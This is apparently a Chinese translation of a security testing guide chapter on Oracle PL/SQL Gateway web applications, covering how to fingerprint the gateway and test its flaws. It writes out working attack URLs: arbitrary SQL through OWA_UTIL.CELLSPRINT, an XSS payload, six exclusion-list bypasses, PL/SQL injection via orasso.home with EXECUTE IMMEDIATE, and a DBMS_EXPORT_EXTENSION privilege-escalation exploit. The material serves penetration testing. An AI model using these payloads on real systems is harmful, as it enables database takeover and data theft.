# 测试Oracle

## 概述

基于Web的PL/SQL应用程序由PL/SQL网关启用，这是将Web请求转换为数据库查询的组件。Oracle开发了许多软件实现，从早期的Web监听器产品到Apache `mod_plsql`模块再到XML数据库（XDB）Web服务器。所有这些都有各自的怪癖和问题，每一个都将在本章中进行彻底研究。使用PL/SQL网关的产品包括但不限于Oracle HTTP Server、eBusiness Suite、Portal、HTMLDB、WebDB和Oracle Application Server。

## 如何测试

### PL/SQL网关工作原理

从本质上讲，PL/SQL网关只是充当代理服务器，接收用户的Web请求并将其传递到数据库服务器，在那里执行。

1. Web服务器接受来自Web客户端的请求，并确定是否应由PL/SQL网关处理该请求。
2. PL/SQL网关通过提取请求的包名称、过程和变量来处理请求。
3. 请求的包和过程包装在匿名PL/SQL块中，并发送到数据库服务器。
4. 数据库服务器执行该过程并将结果作为HTML发送回网关。
5. 网关通过Web服务器将响应发送回客户端。

了解这一点很重要——PL/SQL代码不存在于Web服务器上，而是存在于数据库服务器上。这意味着PL/SQL网关或PL/SQL应用程序中的任何弱点（如果被利用）都会给攻击者直接访问数据库服务器的能力；大量防火墙都无法阻止这一点。

PL/SQL Web应用程序的URL通常很容易识别，通常以下列内容开头（xyz可以是任意字符串，代表数据库访问描述符，稍后会详细介绍）：

- `https://www.example.com/pls/xyz`
- `https://www.example.com/xyz/owa`
- `https://www.example.com/xyz/plsql`

虽然其中第二个和第三个示例表示较旧版本的PL/SQL网关的URL，但第一个表示在Apache上运行的较新版本。在plsql.conf Apache配置文件中，/pls是默认的，指定为带有PLS模块作为处理程序的Location。但是，位置不必是/pls。URL中缺少文件扩展名可能表示存在Oracle PL/SQL网关。考虑以下URL：

`https://www.server.com/aaa/bbb/xxxxx.yyyyy`

如果`xxxxx.yyyyy`被类似`ebank.home`、`store.welcome`、`auth.login`或`books.search`的内容替换，那么有相当大的可能性正在使用PL/SQL网关。也可以在使用它的用户（即模式）之前添加请求的包和过程的名称——在这种情况下，用户是`webuser`：

`https://www.server.com/pls/xyz/webuser.pkg.proc`

在此URL中，xyz是数据库访问描述符（DAD）。DAD指定有关数据库服务器的信息，以便PL/SQL网关可以连接。它包含诸如TNS连接字符串、用户ID和密码、身份验证方法等信息。这些DAD在较新版本的`dads.conf` Apache配置文件或较旧版本的`wdbsvr.app`文件中指定。一些默认DAD包括：

```txt
SIMPLEDAD
HTMLDB
ORASSO
SSODAD
PORTAL
PORTAL2
PORTAL30
PORTAL30_SSO
TEST
DAD
APP
ONLINE
DB
OWA
```

#### 确定PL/SQL网关是否正在运行

在对服务器进行评估时，首先了解您实际处理的是什么技术非常重要。例如，在黑盒评估场景中，如果还不知道，第一件事就是确定这一点。识别基于Web的PL/SQL应用程序非常容易。首先是URL的格式和外观，如上所述。除此之外，还有一组可以执行的简单测试来测试PL/SQL网关的存在。

#### NULL测试

在PL/SQL中，`null`是一个完全有效的表达式：

```sql
SQL> BEGIN
   NULL;
   END;
   /
PL/SQL procedure successfully completed.
```

我们可以使用它来测试服务器是否正在运行PL/SQL网关。只需获取`DAD`并附加`NULL`，然后附加`NOSUCHPROC`：

- `https://www.example.com/pls/dad/null`
- `https://www.example.com/pls/dad/nosuchproc`

如果服务器对第一个返回`200 OK`响应，对第二个返回`404 Not Found`，则表明服务器正在运行PL/SQL网关。

#### 已知包访问

在较旧版本的PL/SQL网关中，可以直接访问构成PL/SQL Web工具包的包，例如OWA和HTP包。其中一个包是`OWA_UTIL`包，我们稍后会详细介绍。此包包含一个名为SIGNATURE的过程，它在HTML中简单输出PL/SQL签名。因此，请求

`https://www.example.com/pls/dad/owa_util.signature`

在网页上返回以下输出

`"This page was produced by the PL/SQL Web Toolkit on date"`

或

`"This page was produced by the PL/SQL Cartridge on date"`

如果您没有收到此响应，而是收到`403 Forbidden`响应，则可以推断PL/SQL网关正在运行。这是您在更高版本或已修补系统上应该获得的响应。

#### 访问数据库中的任意PL/SQL包

可以利用安装在数据库服务器上的默认PL/SQL包中的漏洞。您如何执行此操作取决于PL/SQL网关的版本。在较早版本的PL/SQL网关中，没有什么可以阻止攻击者访问数据库服务器中的任意PL/SQL包。我们之前提到过`OWA_UTIL`包。这可用于运行任意SQL查询：

`https://www.example.com/pls/dad/OWA_UTIL.CELLSPRINT? P_THEQUERY=SELECT+USERNAME+FROM+ALL_USERS`

可以通过HTP包发起跨站脚本攻击：

`https://www.example.com/pls/dad/HTP.PRINT?CBUF=<script>alert('XSS')</script>`

显然，这是危险的，因此Oracle引入了PLSQL Exclusion列表，以防止直接访问此类危险过程。禁止项包括任何以`SYS.*`开头的请求、任何以`DBMS_*`开头的请求、任何带有`HTP.*`或`OWA*`的请求。但是，可以绕过Exclusion列表。更重要的是，Exclusion列表无法防止访问`CTXSYS`和`MDSYS`模式或其他模式中的包，因此可以利用这些包中的缺陷：

`https://www.example.com/pls/dad/CXTSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL`

如果数据库服务器仍然容易受到此缺陷（CVE-2006-0265）的影响，这将返回带有`200 OK`响应的空白HTML页面。

### 测试PL/SQL网关的缺陷

多年来，Oracle PL/SQL网关遭受了多个缺陷的困扰，包括访问管理页面（CVE-2002-0561）、缓冲区溢出（CVE-2002-0559）、目录遍历错误以及允许攻击者绕过Exclusion列表并继续访问和执行数据库服务器中任意PL/SQL包的漏洞。

### 绕过PL/SQL Exclusion列表

Oracle多次尝试修复允许攻击者绕过exclusion列表的缺陷，这是令人惊讶的。每当Oracle产生补丁时，都会被新的绕过技术击败。[这个可悲故事的历史](https://seclists.org/fulldisclosure/2006/Feb/11)

### 绕过Exclusion列表 - 方法1

当Oracle首次引入PL/SQL Exclusion列表以防止攻击者访问任意PL/SQL包时，可以通过在模式/包名称前面加上十六进制编码的换行符、空格或制表符来简单地绕过：

```txt
https://www.example.com/pls/dad/%0ASYS.PACKAGE.PROC
https://www.example.com/pls/dad/%20SYS.PACKAGE.PROC
https://www.example.com/pls/dad/%09SYS.PACKAGE.PROC
```

### 绕过Exclusion列表 - 方法2

较高版本的网关允许攻击者通过在模式/包名称前面加上标签来绕过exclusion列表。在PL/SQL中，标签指向可以使用GOTO语句跳转到的代码行，格式如下：`<<NAME>>`

- `https://www.example.com/pls/dad/<<LBL>>SYS.PACKAGE.PROC`

### 绕过Exclusion列表 - 方法3

只需将模式/包名称放在双引号中就可以允许攻击者绕过exclusion列表。请注意，这在Oracle Application Server 10g上不起作用，因为它在将用户请求发送到数据库服务器之前将其转换为小写，而文字引号区分大小写——因此`SYS`和`sys`不一样，对后者的请求将导致`404 Not Found`。但在较早版本中，以下可以绕过exclusion列表：

`https://www.example.com/pls/dad/"SYS".PACKAGE.PROC`

### 绕过Exclusion列表 - 方法4

根据Web服务器和数据库服务器上使用的字符集，一些字符会被转换。因此，根据使用的字符集，`ÿ`字符（`0xFF`）可能在数据库服务器上转换为`Y`。另一个经常转换为大写`Y`的字符是Macron字符`0xAF`。这可能允许攻击者绕过exclusion列表：

`https://www.example.com/pls/dad/S%FFS.PACKAGE.PROC`
`https://www.example.com/pls/dad/S%AFS.PACKAGE.PROC`

### 绕过Exclusion列表 - 方法5

某些版本的PL/SQL网关允许使用反斜杠`0x5C`绕过exclusion列表：

`https://www.example.com/pls/dad/%5CSYS.PACKAGE.PROC`

### 绕过Exclusion列表 - 方法6

这是绕过exclusion列表最复杂的方法，也是最新修补的方法。如果我们请求以下内容

`https://www.example.com/pls/dad/foo.bar?xyz=123`

应用程序服务器将在数据库服务器上执行以下操作：

```sql
declare
 rc__ number;
 start_time__ binary_integer;
 simple_list__ owa_util.vc_arr;
 complex_list__ owa_util.vc_arr;
begin
 start_time__ := dbms_utility.get_time;
 owa.init_cgi_env(:n__,:nm__,:v__);
 htp.HTBUF_LEN := 255;
 null;
 null;
 simple_list__(1) := 'sys.%';
 simple_list__(2) := 'dbms\_%';
 simple_list__(3) := 'utl\_%';
 simple_list__(4) := 'owa\_%';
 simple_list__(5) := 'owa.%';
 simple_list__(6) := 'htp.%';
 simple_list__(7) := 'htf.%';
 if ((owa_match.match_pattern('foo.bar', simple_list__, complex_list__, true))) then
  rc__ := 2;
 else
  null;
  orasso.wpg_session.init();
  foo.bar(XYZ=>:XYZ);
  if (wpg_docload.is_file_download) then
   rc__ := 1;
   wpg_docload.get_download_file(:doc_info);
   orasso.wpg_session.deinit();
   null;
   null;
   commit;
  else
   rc__ := 0;
   orasso.wpg_session.deinit();
   null;
   null;
   commit;
   owa.get_page(:data__,:ndata__);
  end if;
 end if;
 :rc__ := rc__;
 :db_proc_time__ := dbms_utility.get_time—start_time__;
end;
```

注意第19行和第24行。在第19行，检查用户的请求是否与已知"坏"字符串列表（即exclusion列表）匹配。如果请求的包和过程不包含坏字符串，则在第24行执行该过程。XYZ参数作为绑定变量传递。

如果我们请求以下内容：

`https://server.example.com/pls/dad/INJECT'POINT`

执行以下PL/SQL：

```sql
..
simple_list__(7) := 'htf.%';
if ((owa_match.match_pattern('inject'point', simple_list__ complex_list__, true))) then
 rc__ := 2;
else
 null;
 orasso.wpg_session.init();
 inject'point;
..
```

这会在错误日志中生成错误："PLS-00103: Encountered the symbol 'POINT' when expecting one of the following. . ." 我们这里有一种方法可以注入任意SQL。这可用于绕过exclusion列表。首先，攻击者需要找到一个不需要参数且与exclusion列表中任何内容都不匹配的PL/SQL过程。有相当数量的默认包符合此条件，例如：

```txt
JAVA_AUTONOMOUS_TRANSACTION.PUSH
XMLGEN.USELOWERCASETAGNAMES
PORTAL.WWV_HTP.CENTERCLOSE
ORASSO.HOME
WWC_VERSION.GET_HTTP_DATABASE_INFO
```

攻击者应选择目标系统上实际可用的函数之一（即在请求时返回`200 OK`）。作为测试，攻击者可以请求

`https://server.example.com/pls/dad/orasso.home?FOO=BAR`

服务器应返回`404 File Not Found`响应，因为orasso.home过程不需要参数并提供了一个。但是，在返回404之前，执行了以下PL/SQL：

```sql
..
if ((owa_match.match_pattern('orasso.home', simple_list__, complex_list__, true))) then
 rc__ := 2;
else
 null;
 orasso.wpg_session.init();
 orasso.home(FOO=>:FOO);
..
..
```

注意攻击者查询字符串中FOO的存在。攻击者可以滥用此功能运行任意SQL。首先，他们需要关闭括号：

`https://server.example.com/pls/dad/orasso.home?);--=BAR`

这会导致执行以下PL/SQL：

```sql
..
orasso.home();--=>:);--);
..
```

请注意，双减号（`--`）之后的任何内容都被视为注释。此请求将导致内部服务器错误，因为其中一个绑定变量不再使用，因此攻击者需要将其添加回来。事实证明，正是这个绑定变量是运行任意PL/SQL的关键。目前，他们只需使用`HTP.PRINT`打印BAR，并将所需的绑定变量添加为:1：

`https://server.example.com/pls/dad/orasso.home?);HTP.PRINT(:1);--=BAR`

这将返回带有HTML中单词"BAR"的`200`。这里发生的情况是，等号后面的所有内容——本例中的BAR——被插入绑定变量。使用相同的技术，还可以再次访问owa_util.cellsprint：

`https://www.example.com/pls/dad/orasso.home?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS`

要执行任意SQL，包括DML和DDL语句，攻击者插入立即执行:1：

`https://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1;--=select%201%20from%20dual`

请注意，输出不会显示。这可用于利用SYS拥有的任何PL/SQL注入缺陷，从而能够完全控制后端数据库服务器。例如，以下URL利用了`DBMS_EXPORT_EXTENSION`中的SQL注入缺陷：

```txt
https://www.example.com/pls/dad/orasso.home?);
execute%20immediate%20:1;--=DECLARE%20BUF%20VARCHAR2(2000);%20BEGIN%20
BUF:=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('INDEX_NAME','INDEX_SCHEMA','DBMS_OUTPUT.PUT_LINE(:p1); EXECUTE%20IMMEDIATE%20''CREATE%20OR%20REPLACE%20
PUBLIC%20SYNONYM%20BREAKABLE%20FOR%20SYS.OWA_UTIL'';
END;--','SYS',1,'VER',0);END;
```

### 评估自定义PL/SQL Web应用程序

在进行黑盒安全评估时，自定义PL/SQL应用程序的代码不可用，但仍然需要评估其安全漏洞。

#### 测试SQL注入

每个输入参数都应测试SQL注入缺陷。这些很容易找到和确认。发现它们就像在参数中嵌入单引号并检查错误响应一样简单（包括404 Not Found错误）。可以使用连接运算符确认SQL注入的存在。

例如，假设有一个书店PL/SQL Web应用程序，允许用户按给定作者搜索书籍：

`https://www.example.com/pls/bookstore/books.search?author=DICKENS`

如果此请求返回Charles Dickens的书籍，但

`https://www.example.com/pls/bookstore/books.search?author=DICK'ENS`

返回错误或`404`，则可能存在SQL注入缺陷。这可以通过使用连接运算符来确认：

`https://www.example.com/pls/bookstore/books.search?author=DICK'||'ENS`

如果此请求返回Charles Dickens的书籍，则确认存在SQL注入漏洞。
